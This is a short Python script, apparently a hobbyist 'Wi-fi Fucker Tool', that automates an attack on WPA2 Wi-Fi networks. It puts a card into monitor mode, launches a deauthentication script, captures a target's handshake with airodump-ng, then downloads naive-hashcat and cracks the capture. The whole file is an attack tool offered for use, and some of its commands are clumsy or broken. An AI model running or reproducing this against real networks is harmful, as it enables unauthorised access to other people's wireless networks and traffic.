import os , time , pyautogui
import webbrowser
import sys
print("""

    ███████████████████████████████
    █                             █
    █═╬═════════════════════════╬═█
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░Wi-fi Fucker Tool░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░coded by arda6░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █ ║░░░░░░░░░░░░░░░░░░░░░░░░░║ █
    █═╬═════════════════════════╬═█
    █                             █
    ███████████████████████████████


""")

pla = sys.platform
if pla == "win32":
    win = "Windows"
    print("     [!] Your Platform is " +win+ "\n")
elif pla == "darwin":
    mac = "MacOs"
    print("     [+] Your Platform is " +mac+ "\n")
elif pla == "linux":
    mac = "Linux"
    print("     [+] Your Platform is " +mac+"\n")
if pla == "win32":
    print("     [!] Not Suitable For Tool Windows \n")
    time.sleep(3)
    exit("     [#] https://www.github/arda6")

os.system("sudo airmon-ng start")
print("░░░░░░░░░░░░░░░░░░░░ ═")
wifi = input("░░Select Wifi Card░░ ═ \n░░░░░░░░░░░░░░░░░░░░ ═ ")
os.system("sudo airmon-ng start " +wifi+"mon")
time.sleep(1)
os.system("start python3 deauth.py")
pyautogui.press("ctrl+c")
print("░░░░░░░░░░░░░░░░░░ ═")
channel = input("░░Select Channel░░ ═ \n░░░░░░░░░░░░░░░░░░ ═ ")
print("")
print("░░░░░░░░░░░░░░░░ ═ ")
bssid = input("░░Select BSSID░░ ═ \n░░░░░░░░░░░░░░░░ ═ ")
os.system("sudo airodump-ng -c "+channel+" --bssid "+bssid+ " -w /root/Desktop/eyllwpa2.cap " +wifi+"mon")
print(".cap to .hccapx => https://hashcat.net/cap2hccapx/ ")
webbrowser.open("https://hashcat.net/cap2hccapx/")
os.system("git clone https://github.com/brannondorsey/naive-hashcat.git")
print("░░░░░░░░░░░░░░░░ ═")
down = input("░░.hccapx Path░░ ═ \n░░░░░░░░░░░░░░░░ ═ ")
os.system("HASH_FILE="+down+" POT_FILE=cracked-wpa2-by-eyll.pot HASH_TYPE=2500 ./naive-hashcat.sh")
